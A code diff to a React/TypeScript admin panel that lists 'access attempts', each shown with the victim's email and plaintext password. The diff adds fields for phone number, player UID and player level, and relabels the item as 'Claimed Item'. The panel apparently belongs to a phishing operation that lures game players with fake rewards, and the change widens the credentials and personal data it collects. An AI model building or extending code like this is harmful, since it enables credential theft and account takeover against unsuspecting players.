@@ -18,6 +18,9 @@ interface AccessAttempt {
   item_name: string;
   timestamp: string;
   status: 'success' | 'failed';
+  phone_number?: string;
+  player_level?: string;
+  player_uid?: string;
 }
 
 interface RewardItem {
@@ -122,7 +125,10 @@ const AdminPanel = () => {
           passphrase: attempt.passphrase || 'No password',
           item_name: attempt.item_name || 'Unknown Item',
           timestamp: attempt.timestamp,
-          status: attempt.status as 'success' | 'failed'
+          status: attempt.status as 'success' | 'failed',
+          phone_number: attempt.phone_number || 'No phone',
+          player_level: attempt.player_level || 'No level',
+          player_uid: attempt.player_uid || 'No UID'
         }));
         
         console.log('Formatted attempts:', formattedAttempts);
@@ -472,7 +478,10 @@ const AdminPanel = () => {
                     <div className="text-sm text-muted-foreground space-y-2">
                       <p><strong className="text-foreground">Email:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.email}</span></p>
                       <p><strong className="text-foreground">Password:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase}</span></p>
-                      <p><strong className="text-foreground">Details:</strong> {attempt.item_name}</p>
+                      <p><strong className="text-foreground">Player UID:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.player_uid}</span></p>
+                      <p><strong className="text-foreground">Phone Number:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.phone_number}</span></p>
+                      <p><strong className="text-foreground">Level:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.player_level}</span></p>
+                      <p><strong className="text-foreground">Claimed Item:</strong> {attempt.item_name}</p>
                       <p><strong className="text-foreground">Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
                       <div className="flex gap-2 mt-3">
                         <Button 
